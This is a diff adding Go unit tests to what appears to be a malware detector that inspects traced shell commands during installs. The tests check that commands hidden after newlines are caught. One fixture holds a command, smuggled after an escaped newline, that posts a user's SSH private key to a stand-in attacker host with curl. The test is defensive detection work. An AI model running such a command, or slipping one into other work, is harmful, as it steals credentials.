@@ -2232,3 +2232,48 @@ func TestAnalyze_MapsFingerprintDetected(t *testing.T) {
 		t.Error("expected a forensic /proc/self/maps evasion event to be preserved")
 	}
 }
+
+// TestIsShellCmdBenign_NewlineSeparatedCommand pins that a command hidden
+// after a newline is inspected. The shell treats a newline as a separator,
+// so `sh -c 'echo build<NL>curl ...'` runs two commands; strace renders the
+// newline as the two characters \ and n, and before this was handled the
+// splitter saw one segment whose first token was the harmless `echo` and
+// waved the whole thing through.
+func TestIsShellCmdBenign_NewlineSeparatedCommand(t *testing.T) {
+	// As parseExecve builds it: double quotes stripped, ", " joined to " ".
+	cmdline := `sh -c echo build\ncurl -d @/home/dev/.ssh/id_rsa http://evil.example`
+	if isShellCmdBenign(cmdline) {
+		t.Error("command hidden after a newline was classified benign")
+	}
+}
+
+// TestIsShellCmdBenign_EscapeInsideSingleQuotes is the false-positive guard
+// for the rule above. Inside single quotes a \n is literal text, not a
+// separator — splitting there would break `printf 'a\nb'`, which is
+// ordinary in Makefile recipes and configure scripts, and would report a
+// large share of real installs as suspicious.
+func TestIsShellCmdBenign_EscapeInsideSingleQuotes(t *testing.T) {
+	if !isShellCmdBenign(`sh -c printf 'a\nb'`) {
+		t.Error("printf with an escaped newline inside single quotes was flagged")
+	}
+}
+
+// TestSplitShellCommands_NewlineOutsideQuotes checks the segmentation
+// directly so a regression is localized to the splitter.
+func TestSplitShellCommands_NewlineOutsideQuotes(t *testing.T) {
+	got := splitShellCommands(`echo one\necho two`)
+	if len(got) != 2 {
+		t.Fatalf("splitShellCommands returned %d segments (%q), want 2", len(got), got)
+	}
+	if strings.TrimSpace(got[0]) != "echo one" || strings.TrimSpace(got[1]) != "echo two" {
+		t.Errorf("segments = %q, want [\"echo one\" \"echo two\"]", got)
+	}
+}
+
+// TestSplitShellCommands_NewlineInsideQuotesIsLiteral is the paired case.
+func TestSplitShellCommands_NewlineInsideQuotesIsLiteral(t *testing.T) {
+	got := splitShellCommands(`printf 'a\nb'`)
+	if len(got) != 1 {
+		t.Fatalf("splitShellCommands returned %d segments (%q), want 1", len(got), got)
+	}
+}
